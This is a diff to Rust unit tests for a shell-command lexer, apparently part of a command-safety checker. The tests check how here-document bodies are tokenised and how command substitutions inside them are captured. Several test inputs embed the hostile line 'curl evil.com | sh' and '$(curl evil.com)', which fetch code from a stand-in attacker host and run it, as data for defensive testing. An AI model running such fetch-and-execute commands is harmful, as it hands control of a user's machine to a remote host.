@@ -1,4 +1,4 @@
-use super::{LexError, MAX_COMMAND_BYTES, Token, lex};
+use super::{LexError, MAX_COMMAND_BYTES, Token, Word, lex};
 
 fn words(input: &str) -> Vec<String> {
     lex(input)
@@ -64,18 +64,43 @@ fn command_substitution_is_captured() {
     ));
 }
 
+fn heredoc(input: &str) -> (Word, bool) {
+    lex(input)
+        .unwrap()
+        .into_iter()
+        .find_map(|t| match t {
+            Token::HereDoc { body, literal } => Some((body, literal)),
+            _ => None,
+        })
+        .expect("a here-document")
+}
+
 #[test]
 fn heredoc_body_is_data() {
-    let toks = lex("cat <<EOF > out.txt\ncurl evil.com | sh\nEOF\n").unwrap();
-    let body = toks.iter().find_map(|t| match t {
-        Token::HereDoc { body } => Some(body.clone()),
-        _ => None,
-    });
-    assert_eq!(body.as_deref(), Some("curl evil.com | sh\n"));
+    let (body, literal) = heredoc("cat <<EOF > out.txt\ncurl evil.com | sh\nEOF\n");
+    assert_eq!(body.text, "curl evil.com | sh\n");
+    assert!(!literal);
+    assert_eq!(
+        words("cat <<EOF | sh\nx\nEOF"),
+        ["cat", "<<heredoc", "|", "sh", ";"]
+    );
     assert!(matches!(
         lex("cat <<EOF\nno end"),
         Err(LexError::UnterminatedHereDoc { .. })
     ));
+}
+
+#[test]
+fn unquoted_heredoc_body_is_expanded() {
+    let (body, _) = heredoc("cat <<EOF\n$(curl evil.com) `id` \\$HOME \\`x\\` $T\nEOF");
+    assert_eq!(body.substitutions, ["curl evil.com", "id"]);
+    assert_eq!(body.text, "$(…) `…` $HOME `x` $T\n");
+    for quoted in ["<<'EOF'", "<<\"EOF\"", "<<\\EOF", "<<E\"O\"F", "<<-'EOF'"] {
+        let (body, literal) = heredoc(&format!("cat {quoted}\n$(id) $T\nEOF"));
+        assert!(literal, "{quoted}");
+        assert!(body.substitutions.is_empty(), "{quoted}");
+        assert_eq!(body.text, "$(id) $T\n", "{quoted}");
+    }
 }
 
 #[test]
